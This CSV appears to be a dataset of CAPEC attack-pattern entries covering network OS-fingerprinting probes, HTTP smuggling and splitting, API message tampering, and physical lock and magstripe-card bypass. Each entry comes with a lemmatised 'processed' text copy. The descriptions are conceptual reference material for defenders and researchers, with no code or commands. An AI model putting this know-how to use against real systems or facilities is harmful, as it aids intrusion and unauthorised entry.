id,name,description,processed
CAPEC-322,TCP (ISN) Greatest Common Divisor Probe,This OS fingerprinting probe sends a number of TCP SYN packets to an open port of a remote machine. The Initial Sequence Number (ISN) in each of the SYN/ACK response packets is analyzed to determine the smallest number that the target host uses when incrementing sequence numbers. This information can be useful for identifying an operating system because particular operating systems and versions increment sequence numbers using different values. The result of the analysis is then compared against a database of OS behaviors to determine the OS type and/or version.,os fingerprinting probe send number tcp syn packet open port remote machine initial sequence number isn syn ack response packet analyze determine small number target host use incremente sequence number information useful identify operate system particular operate system version increment sequence number different value result analysis compare database os behavior determine os type version
CAPEC-323,TCP (ISN) Counter Rate Probe,This OS detection probe measures the average rate of initial sequence number increments during a period of time. Sequence numbers are incremented using a time-based algorithm and are susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely operation system matches.,os detection probe measure average rate initial sequence number increment period time sequence number incremente time base algorithm susceptible timing analysis determine number increment unit time result analysis compare database operate system version determine likely operation system match
CAPEC-324,TCP (ISN) Sequence Predictability Probe,"This type of operating system probe attempts to determine an estimate for how predictable the sequence number generation algorithm is for a remote host. Statistical techniques, such as standard deviation, can be used to determine how predictable the sequence number generation is for a system. This result can then be compared to a database of operating system behaviors to determine a likely match for operating system and version.",type operating system probe attempt determine estimate predictable sequence number generation algorithm remote host statistical technique standard deviation determine predictable sequence number generation system result compare database operating system behavior determine likely match operating system version
CAPEC-325,TCP Congestion Control Flag (ECN) Probe,"This OS fingerprinting probe checks to see if the remote host supports explicit congestion notification (ECN) messaging. ECN messaging was designed to allow routers to notify a remote host when signal congestion problems are occurring. Explicit Congestion Notification messaging is defined by RFC 3168. Different operating systems and versions may or may not implement ECN notifications, or may respond uniquely to particular ECN flag types.",os fingerprinting probe check remote host support explicit congestion notification ecn messaging ecn messaging design allow router notify remote host signal congestion problem occur explicit congestion notification messaging define rfc different operating system version implement ecn notification respond uniquely particular ecn flag type
CAPEC-326,TCP Initial Window Size Probe,"This OS fingerprinting probe checks the initial TCP Window size. TCP stacks limit the range of sequence numbers allowable within a session to maintain the ""connected"" state within TCP protocol logic. The initial window size specifies a range of acceptable sequence numbers that will qualify as a response to an ACK packet within a session. Various operating systems use different Initial window sizes. The initial window size can be sampled by establishing an ordinary TCP connection.",os fingerprinting probe check initial tcp window size tcp stack limit range sequence number allowable session maintain connect state tcp protocol logic initial window size specify range acceptable sequence number qualify response ack packet session operate system use different initial window size initial window size sample establish ordinary tcp connection
CAPEC-327,TCP Options Probe,"This OS fingerprinting probe analyzes the type and order of any TCP header options present within a response segment. Most operating systems use unique ordering and different option sets when options are present. RFC 793 does not specify a required order when options are present, so different implementations use unique ways of ordering or structuring TCP options. TCP options can be generated by ordinary TCP traffic.",os fingerprinting probe analyze type order tcp header option present response segment operate system use unique ordering different option set option present rfc specify require order option present different implementation use unique way order structure tcp option tcp option generate ordinary tcp traffic
CAPEC-328,TCP 'RST' Flag Checksum Probe,This OS fingerprinting probe performs a checksum on any ASCII data contained within the data portion or a RST packet. Some operating systems will report a human-readable text message in the payload of a 'RST' (reset) packet when specific types of connection errors occur. RFC 1122 allows text payloads within reset packets but not all operating systems or routers implement this functionality.,os fingerprinting probe perform checksum ascii datum contain data portion rst packet operating system report human readable text message payload rst reset packet specific type connection error occur rfc allow text payload reset packet operating system router implement functionality
CAPEC-329,ICMP Error Message Quoting Probe,"An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the amount of data returned or ""Quoted"" from the originating request that generated the ICMP error message.For this purpose ""Port Unreachable"" error messages are often used, as generating them requires the adversary to send a UDP datagram to a closed port on the target. The goal of this analysis to make inferences about the type of operating system or firmware that sent the error message in reply.This is useful for identifying unique characteristics of operating systems because the RFC-1122 expected behavior reads: ""Every ICMP error message includes the Internet header and at least the first 8 data octets of the datagram that triggered the error; more than 8 octets MAY be sent [...]."" This contrasts with RFC-792 expected behavior, which limited the quoted text to 64 bits (8 octets). Given the latitude in the specification the resulting RFC-1122 stack implementations often respond with a high degree of variability in the amount of data quoted in the error message because ""older"" or ""legacy"" stacks may comply with the RFC-792 specification, while other stacks may choose a longer format in accordance with RFC-1122. As a general rule most operating systems or firmware will quote the first 8 bytes of the datagram triggering the error, but some IP stacks will quote more than the first 8 bytes of data.",adversary use technique generate icmp error message port unreachable destination unreachable redirect source quench time exceed parameter problem target analyze datum return quote originate request generate icmp error message purpose port unreachable error message generate require adversary send udp datagram closed port target goal analysis inference type operating system firmware send error message reply useful identify unique characteristic operating system expect behavior read icmp error message include internet header data octet datagram trigger error octet send contrast expect behavior limit quote text bit octet give latitude specification result stack implementation respond high degree variability datum quote error message old legacy stack comply specification stack choose long format accordance general rule operate system firmware quote byte datagram trigger error ip stack quote byte datum
CAPEC-33,HTTP Request Smuggling,"An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages using various HTTP headers, request-line and body parameters as well as message sizes (denoted by the end of message signaled by a given HTTP header) by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to secretly send unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server).See CanPrecede relationships for possible consequences.A maliciously crafted HTTP request, which contains a second secretly embedded HTTP request is interpreted by an intermediary web proxy as single benign HTTP request, is forwarded to a back-end server, that interprets and parses the HTTP request as two authorized benign HTTP requests bypassing security controls.This attack usually involves the misuse of the HTTP headers: Content-Length and Transfer-Encoding. These abuses are discussed in RFC 2616 #4.4.3 and section #4.2 and are related to ordering and precedence of these headers. [REF-38]Additionally this attack can be performed through modification and/or fuzzing of parameters composing the request-line of HTTP messages.This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions in the HTTP agents.This differs from CAPEC-273 HTTP Response Smuggling, which is usually an attempt to compromise a client agent (e.g., web browser) by sending malicious content in HTTP responses from back-end HTTP infrastructure. HTTP Request Smuggling is an attempt to compromise aback-end HTTP agentvia HTTP Request messages.HTTP Splitting (CAPEC-105 and CAPEC-34) is different from HTTP Smuggling due to the fact that during implementation of asynchronous requests, HTTP Splitting requires the embedding/injection of arbitrary HTML headers and content through user input into browser cookies or Ajax web/browser object parameters like XMLHttpRequest.",adversary abuse flexibility discrepancy parsing interpretation http request message http header request line body parameter message size denote end message signal give http header different intermediary http agent load balancer reverse proxy web caching proxy application firewall etc secretly send unauthorized malicious http request end http agent web canprecede relationship possible consequence maliciously craft http request contain second secretly embed http request interpret intermediary web proxy single benign http request forward end server interpret parse http request authorize benign http request bypass security control attack usually involve misuse http header content length transfer encoding abuse discuss rfc section relate ordering precedence header attack perform modification fuzzing parameter compose request line http message attack usually result usage outdated incompatible http protocol version http agent differ http response smuggling usually attempt compromise client agent web browser send malicious content http response end http infrastructure http request smuggling attempt compromise aback end http agentvia http request message http splitting different http smuggling fact implementation asynchronous request http splitting require embedding injection arbitrary html header content user input browser cookie ajax web browser object parameter like xmlhttprequest
CAPEC-330,ICMP Error Message Echoing Integrity Probe,"An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the integrity of data returned or ""Quoted"" from the originating request that generated the error message.A tremendous amount of information about the host operating system can be deduced from its 'echoing' characteristics. Notably, inspection of key protocol header fields, including the echoed header fields of the encapsulating protocol can yield a wealth of data about the host operating system or firmware version.For this purpose ""Port Unreachable"" error messages are often used, as generating them requires the adversary to send a UDP datagram to a closed port on the target. When replying with an ICMP error message some IP/ICMP stack implementations change aspects of the IP header, change or reverse certain byte orders, reset certain field values to default values which differ between operating system and firmware implementations, and make other changes. Some IP/ICMP stacks are decidedly broken, indicating an idiosyncratic behavior that differs from the RFC specifications, such as the case when miscalculations affect a field value.",adversary use technique generate icmp error message port unreachable destination unreachable redirect source quench time exceed parameter problem target analyze integrity datum return quote originate request generate error message tremendous information host operate system deduce echo characteristic notably inspection key protocol header field include echo header field encapsulate protocol yield wealth datum host operate system firmware version purpose port unreachable error message generate require adversary send udp datagram closed port target reply icmp error message ip icmp stack implementation change aspect ip header change reverse certain byte order reset certain field value default value differ operating system firmware implementation change ip icmp stack decidedly broken indicate idiosyncratic behavior differ rfc specification case miscalculation affect field value
CAPEC-331,ICMP IP Total Length Field Probe,"An adversary sends a UDP packet to a closed port on the target machine to solicit an IP Header's total length field value within the echoed 'Port Unreachable"" error message. This type of behavior is useful for building a signature-base of operating system responses, particularly when error messages contain other types of information that is useful identifying specific operating system responses.RFC1122 specifies that the Header of the request must be echoed back when an error is sent in response, but some operating systems and firmware alter the integrity of the original header. Non-standard ICMP/IP implementations result in response that are useful for individuating remote operating system or router firmware versions. There are four general response types that can be used to distinguish operating systems apart: 1) the IP total length field may be calculated correctly, 2) an operating system may add 20 or more additional bytes to the length calculation, 3) the operating system may subtract 20 or more bytes from the correct length of the field or 4) the IP total length field is calculated with any other incorrect value.",adversary send udp packet closed port target machine solicit ip header total length field value echo port unreachable error message type behavior useful build signature base operating system response particularly error message contain type information useful identify specific operate system response specify header request echo error send response operating system firmware alter integrity original header non standard icmp ip implementation result response useful individuate remote operate system router firmware version general response type distinguish operate system apart ip total length field calculate correctly operate system add additional byte length calculation operate system subtract byte correct length field ip total length field calculate incorrect value
CAPEC-332,ICMP IP 'ID' Field Error Message Probe,"An adversary sends a UDP datagram having an assigned value to its internet identification field (ID) to a closed port on a target to observe the manner in which this bit is echoed back in the ICMP error message. This allows the attacker to construct a fingerprint of specific OS behaviors.The internet identification field (ID) is typically utilized for reassembling a fragmented packet. RFC791 and RFC815 discusses about IP datagrams, fragmentation and reassembly. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within the ICMP error message. There are three behaviors related to the IP ID field that can be used to distinguish remote operating systems or firmware: 1) it is echoed back identically to the bit order of the ID field in the original IP header, 2) it is echoed back, but the byte order has been reversed, or it contains an incorrect or unexpected value. Different operating systems will respond by setting the IP ID field differently within error messaging.",adversary send udp datagram have assign value internet identification field id closed port target observe manner bit echo icmp error message allow attacker construct fingerprint specific os behavior internet identification field id typically utilize reassemble fragment packet discuss ip datagram fragmentation reassembly operating system router firmware reverse bit order id field echo ip header portion original datagram icmp error message behavior relate ip id field distinguish remote operate system firmware echo identically bit order id field original ip header echo byte order reverse contain incorrect unexpected value different operating system respond set ip id field differently error messaging
CAPEC-34,HTTP Response Splitting,"An adversary manipulates and injects malicious content, in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., web server) or into an already spoofed HTTP response from an adversary controlled domain/site.See CanPrecede relationships for possible consequences.Malicious user input is injected into various standard and/or user defined HTTP headers within a HTTP Response through use of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters, and unique character encoding.A single HTTP response ends up being split as two or more HTTP responses by the targeted client HTTP agent parsing the original maliciously manipulated HTTP response. This allows malicious HTTP responses to bypass security controls in order to implement malicious actions and provide malicious content that allows access to sensitive data and to compromise applications and users. This is performed by the abuse of interpretation and parsing discrepancies in different intermediary HTTP agents (load balancer, reverse proxy, web caching proxies, application firewalls, etc.) or client HTTP agents (e.g., web browser) in the path of the malicious HTTP responses.This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions as well as lack of syntax checking and filtering of user input in the HTTP agents receiving HTTP messages in the path.This differs from CAPEC-105 HTTP Request Splitting, which is usually an attempt to compromise a back-end HTTP agent via HTTP Request messages. HTTP Response Splitting is an attempt to compromise aclient agent (e.g., web browser)by sending malicious content in HTTP responses from back-end HTTP infrastructure.HTTP Smuggling (CAPEC-33 and CAPEC-273) is different from HTTP Splitting due to the fact it relies upon discrepancies in the interpretation of various HTTP Headers and message sizes and not solely user input of special characters and character encoding. HTTP Smuggling was established to circumvent mitigations against HTTP Request Splitting techniques.",adversary manipulate inject malicious content form secret unauthorized http response single http response vulnerable compromised end http agent web server spoof http response adversary control domain site canprecede relationship possible consequence malicious user input inject standard user define http header http response use carriage return cr line feed lf horizontal tab ht space sp character valid rfc compliant special character unique character encoding single http response end split http response target client http agent parse original maliciously manipulate http response allow malicious http response bypass security control order implement malicious action provide malicious content allow access sensitive datum compromise application user perform abuse interpretation parsing discrepancy different intermediary http agent load balancer reverse proxy web caching proxy application firewall etc client http agent web browser path malicious http response attack usually result usage outdated incompatible http protocol version lack syntax checking filtering user input http agent receive http message path differ http request splitting usually attempt compromise end http agent http request message http response splitting attempt compromise aclient agent web send malicious content http response end http infrastructure http smuggling different http splitting fact rely discrepancy interpretation http header message size solely user input special character character encoding http smuggling establish circumvent mitigation http request splitting technique
CAPEC-35,Leverage Executable Code in Non-Executable Files,An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.,attack type exploit system trust configuration resource file executable load resource image file configuration file attacker modify file execute malicious code directly manipulate target process application server execute base malicious configuration parameter system increasingly interrelated mash resource local remote source possibility attack occur high
CAPEC-36,Using Unpublished Interfaces or Functionality,"An adversary searches for and invokes interfaces or functionality that the target system designers did not intend to be publicly available. If interfaces fail to authenticate requests, the attacker may be able to invoke functionality they are not authorized for.Adversaries can also search for undocumented bits on a hardware device, commonly known as ""chicken bits"". These bits are used to enable/disable certain functionality, but are not published. Adversaries can reverse engineer firmware to identify hidden features and change these bits at runtime to achieve malicious behavior.",adversary search invoke interface functionality target system designer intend publicly available interface fail authenticate request attacker able invoke functionality authorize adversary search undocumented bit hardware device commonly know chicken bit bit enable disable certain functionality publish adversary reverse engineer firmware identify hidden feature change bit runtime achieve malicious behavior
CAPEC-37,Retrieve Embedded Sensitive Data,"An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack.",attacker examine target system find sensitive datum embed information reveal confidential content account number individual key credential intermediate step large attack
CAPEC-38,Leveraging/Manipulating Configuration File Search Paths,"This pattern of attack sees an adversary load a malicious resource into a program's standard path so that when a known command is executed then the system instead executes the malicious component. The adversary can either modify the search path a program uses, like a PATH variable or classpath, or they can manipulate resources on the path to point to their malicious components. J2EE applications and other component based applications that are built from multiple binaries can have very long list of dependencies to execute. If one of these libraries and/or references is controllable by the attacker then application controls can be circumvented by the attacker.",pattern attack see adversary load malicious resource program standard path known command execute system instead execute malicious component adversary modify search path program use like path variable classpath manipulate resource path point malicious component application component base application build multiple binary long list dependency execute library reference controllable attacker application control circumvent attacker
CAPEC-383,Harvesting Information via API Event Monitoring,"An adversary hosts an event within an application framework and then monitors the data exchanged during the course of the event for the purpose of harvesting any important data leaked during the transactions. One example could be harvesting lists of usernames or userIDs for the purpose of sending spam messages to those users. One example of this type of attack involves the adversary creating an event within the sub-application. Assume the adversary hosts a ""virtual sale"" of rare items. As other users enter the event, the attacker records via AiTM (CAPEC-94) proxy the user_ids and usernames of everyone who attends. The adversary would then be able to spam those users within the application using an automated script.",adversary host event application framework monitor datum exchange course event purpose harvest important datum leak transaction example harvest list username userid purpose send spam message user example type attack involve adversary create event sub application assume adversary host virtual sale rare item user enter event attacker record aitm proxy username attend adversary able spam user application automate script
CAPEC-384,Application API Message Manipulation via Man-in-the-Middle,"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack can allow the attacker to gain unauthorized privileges within the application, or conduct attacks such as phishing, deceptive strategies to spread malware, or traditional web-application attacks. The techniques require use of specialized software that allow the attacker to perform adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system. Despite the use of AiTH software, the attack is actually directed at the server, as the client is one node in a series of content brokers that pass information along to the application framework. Additionally, it is not true ""Adversary-in-the-Middle"" attack at the network layer, but an application-layer attack the root cause of which is the master applications trust in the integrity of code supplied by the client.",attacker manipulate egress ingress datum client application framework order change content message perform attack allow attacker gain unauthorized privilege application conduct attack phishing deceptive strategy spread malware traditional web application attack technique require use specialized software allow attacker perform adversary middle communication web browser remote system despite use aith software attack actually direct server client node series content broker pass information application framework additionally true adversary middle attack network layer application layer attack root cause master application trust integrity code supply client
CAPEC-385,Transaction or Event Tampering via Application API Manipulation,"An attacker hosts or joins an event or transaction within an application framework in order to change the content of messages or items that are being exchanged. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, substitute one item or another, spoof an existing item and conduct a false exchange, or otherwise change the amounts or identity of what is being exchanged. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the content of various application elements. Often, items exchanged in game can be monetized via sales for coin, virtual dollars, etc. The purpose of the attack is for the attack to scam the victim by trapping the data packets involved the exchange and altering the integrity of the transfer process.",attacker host join event transaction application framework order change content message item exchange perform attack allow attacker manipulate content way produce message content look authentic contain deceptive link substitute item spoof exist item conduct false exchange change amount identity exchange technique require use specialized software allow attacker man middle communication web browser remote system order change content application element item exchange game monetize sale coin virtual dollar etc purpose attack attack scam victim trap datum packet involve exchange alter integrity transfer process
CAPEC-386,Application API Navigation Remapping,"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of links/buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains links/buttons that point to an attacker controlled destination. Some applications make navigation remapping more difficult to detect because the actual HREF values of images, profile elements, and links/buttons are masked. One example would be to place an image in a user's photo gallery that when clicked upon redirected the user to an off-site location. Also, traditional web vulnerabilities (such as CSRF) can be constructed with remapped buttons or links. In some cases navigation remapping can be used for Phishing attacks or even means to artificially boost the page view, user site reputation, or click-fraud.",attacker manipulate egress ingress datum client application framework order change destination content link button display user api message perform attack allow attacker manipulate content way produce message content look authentic contain link button point attacker control destination application navigation remapping difficult detect actual href value image profile element link button mask example place image user photo gallery click redirect user site location traditional web vulnerability csrf construct remappe button link case navigation remapping phishing attack mean artificially boost page view user site reputation click fraud
CAPEC-387,Navigation Remapping To Propagate Malicious Content,"An adversary manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic.Performing this attack allows the adversary to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the adversarys' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the adversarys' intent. When the goal is to spread malware, deceptive content is created such as modified links, buttons, or images, that entice users to click on those items, all of which point to a malicious URI. The techniques require use of specialized software that allow the adversary to use adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system in order to change the destination of various application interface elements.",adversary manipulate egress ingress datum client application framework order change content message circumvent expect application logic perform attack allow adversary manipulate content way produce message content look authentic contain deceptive link spam like content link adversarys code general content spoofing application api employ stage different type attack vary base adversary intent goal spread malware deceptive content create modify link button image entice user click item point malicious uri technique require use specialized software allow adversary use adversary middle communication web browser remote system order change destination application interface element
CAPEC-388,Application API Button Hijacking,An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains buttons that point to an attacker controlled destination.,attacker manipulate egress ingress datum client application framework order change destination content button display user api message perform attack allow attacker manipulate content way produce message content look authentic contain button point attacker control destination
CAPEC-389,Content Spoofing Via Application API Manipulation,"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. The techniques require use of specialized software that allow the attacker to use adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system.",attacker manipulate egress ingress datum client application framework order change content message perform attack allow attacker manipulate content way produce message content look authentic contain deceptive link spam like content link attacker code general content spoofing application api employ stage different type attack vary base attacker intent technique require use specialized software allow attacker use adversary middle communication web browser remote system
CAPEC-39,Manipulating Opaque Client-based Data Tokens,"In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation.",circumstance application hold important datum client token cookie url datum file forth datum manipulate client server application component reinterpret datum authentication token datum store item pricing wallet information opaquely manipulate datum bear fruit attacker pattern attacker undermine assumption client token adequately protect tamper use encryption obfuscation
CAPEC-390,Bypassing Physical Security,"Facilities often used layered models for physical security such as traditional locks, Electronic-based card entry systems, coupled with physical alarms. Hardware security mechanisms range from the use of computer case and cable locks as well as RFID tags for tracking computer assets. This layered approach makes it difficult for random physical security breaches to go unnoticed, but is less effective at stopping deliberate and carefully planned break-ins. Avoiding detection begins with evading building security and surveillance and methods for bypassing the electronic or physical locks which secure entry points.",facility layer model physical security traditional lock electronic base card entry system couple physical alarm hardware security mechanism range use computer case cable lock rfid tag track computer asset layered approach make difficult random physical security breach unnoticed effective stop deliberate carefully plan break in avoid detection begin evade building security surveillance method bypass electronic physical lock secure entry point
CAPEC-391,Bypassing Physical Locks,"An attacker uses techniques and methods to bypass physical security measures of a building or facility. Physical locks may range from traditional lock and key mechanisms, cable locks used to secure laptops or servers, locks on server cases, or other such devices. Techniques such as lock bumping, lock forcing via snap guns, or lock picking can be employed to bypass those locks and gain access to the facilities or devices they protect, although stealth, evidence of tampering, and the integrity of the lock following an attack, are considerations that may determine the method employed. Physical locks are limited by the complexity of the locking mechanism. While some locks may offer protections such as shock resistant foam to prevent bumping or lock forcing methods, many commonly employed locks offer no such countermeasures.",attacker use technique method bypass physical security measure building facility physical lock range traditional lock key mechanism cable lock secure laptop server lock server case device technique lock bumping lock forcing snap gun lock picking employ bypass lock gain access facility device protect stealth evidence tampering integrity lock follow attack consideration determine method employ physical lock limit complexity locking mechanism lock offer protection shock resistant foam prevent bumping lock forcing method commonly employ lock offer countermeasure
CAPEC-392,Lock Bumping,"An attacker uses a bump key to force a lock on a building or facility and gain entry. Lock Bumping is the use of a special type of key that can be tapped or bumped to cause the pins within the lock to fall into temporary alignment, allowing the lock to be opened. Lock bumping allows an attacker to open a lock without having the correct key. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A bump key is a specially constructed key that exploits this design. When the bump key is struck or firmly tapped, its teeth transfer the force of the tap into the key pins, causing the lock to momentarily shift into proper alignment for the mechanism to be opened.",attacker use bump key force lock building facility gain entry lock bumping use special type key tap bump cause pin lock fall temporary alignment allow lock open lock bumping allow attacker open lock have correct key standard lock secure set internal pin prevent device turn spring load driver pin push key pin correct key insert ridge key push key pin driver pin cause correct alignment allow lock cylinder rotate bump key specially construct key exploit design bump key strike firmly tap tooth transfer force tap key pin cause lock momentarily shift proper alignment mechanism open
CAPEC-393,Lock Picking,"An attacker uses lock picking tools and techniques to bypass the locks on a building or facility. Lock picking is the use of a special set of tools to manipulate the pins within a lock. Different sets of tools are required for each type of lock. Lock picking attacks have the advantage of being non-invasive in that if performed correctly the lock will not be damaged. A standard lock pin-and-tumbler lock is secured by a set of internal pins that prevent the tumbler device from turning. Spring loaded driver pins push down on the key pins preventing rotation so that the bolt remains in a locked position.. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. Most common locks, such as domestic locks in the US, can be picked using a standard 2 tools (i.e. a torsion wrench and a hook pick).",attacker use lock picking tool technique bypass lock building facility lock picking use special set tool manipulate pin lock different set tool require type lock lock picking attack advantage non invasive perform correctly lock damage standard lock pin tumbler lock secure set internal pin prevent tumbler device turn spring load driver pin push key pin prevent rotation bolt remain lock position correct key insert ridge key push key pin driver pin cause correct alignment allow lock cylinder rotate common lock domestic lock pick standard tool torsion wrench hook pick
CAPEC-394,Using a Snap Gun Lock to Force a Lock,"An attacker uses a Snap Gun, also known as a Pick Gun, to force the lock on a building or facility. A Pick Gun is a special type of lock picking instrument that works on similar principles as lock bumping. A snap gun is a hand-held device with an attached metal pick. The metal pick strikes the pins within the lock, transferring motion from the key pins to the driver pins and forcing the lock into momentary alignment. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A Snap Gun exploits this design by using a metal pin to strike all of the key pins at once, forcing the driver pins to shift into an unlocked position. Unlike bump keys or lock picks, a Snap Gun may damage the lock more easily, leaving evidence that the lock has been tampered with.",attacker use snap gun know pick gun force lock building facility pick gun special type lock picking instrument work similar principle lock bumping snap gun hand hold device attach metal pick metal pick strike pin lock transfer motion key pin driver pin force lock momentary alignment standard lock secure set internal pin prevent device turn spring load driver pin push key pin correct key insert ridge key push key pin driver pin cause correct alignment allow lock cylinder rotate snap gun exploit design metal pin strike key pin force driver pin shift unlocked position unlike bump key lock pick snap gun damage lock easily leave evidence lock tamper
CAPEC-395,Bypassing Electronic Locks and Access Controls,"An attacker exploits security assumptions to bypass electronic locks or other forms of access controls. Most attacks against electronic access controls follow similar methods but utilize different tools. Some electronic locks utilize magnetic strip cards, others employ RFID tags embedded within a card or badge, or may involve more sophisticated protections such as voice-print, thumb-print, or retinal biometrics. Magnetic Strip and RFID technologies are the most widespread because they are cost effective to deploy and more easily integrated with other electronic security measures. These technologies share common weaknesses that an attacker can exploit to gain access to a facility protected by the mechanisms via copying legitimate cards or badges, or generating new cards using reverse-engineered algorithms.",attacker exploit security assumption bypass electronic lock form access control attack electronic access control follow similar method utilize different tool electronic lock utilize magnetic strip card employ rfid tag embed card badge involve sophisticated protection voice print thumb print retinal biometric magnetic strip rfid technology widespread cost effective deploy easily integrate electronic security measure technology share common weakness attacker exploit gain access facility protect mechanism copy legitimate card badge generate new card reverse engineer algorithm
CAPEC-397,Cloning Magnetic Strip Cards,"An attacker duplicates the data on a Magnetic strip card (i.e. 'swipe card' or 'magstripe') to gain unauthorized access to a physical location or a person's private information. Magstripe cards encode data on a band of iron-based magnetic particles arrayed in a stripe along a rectangular card. Most magstripe card data formats conform to ISO standards 7810, 7811, 7813, 8583, and 4909. The primary advantage of magstripe technology is ease of encoding and portability, but this also renders magnetic strip cards susceptible to unauthorized duplication. If magstripe cards are used for access control, all an attacker need do is obtain a valid card long enough to make a copy of the card and then return the card to its location (i.e. a co-worker's desk). Magstripe reader/writers are widely available as well as software for analyzing data encoded on the cards. By swiping a valid card, it becomes trivial to make any number of duplicates that function as the original.",attacker duplicate datum magnetic strip card swipe card magstripe gain unauthorized access physical location person private information magstripe card encode datum band iron base magnetic particle array stripe rectangular card magstripe card data format conform iso standard primary advantage magstripe technology ease encoding portability render magnetic strip card susceptible unauthorized duplication magstripe card access control attacker need obtain valid card long copy card return card location co worker desk magstripe reader writer widely available software analyze datum encode card swipe valid card trivial number duplicate function original
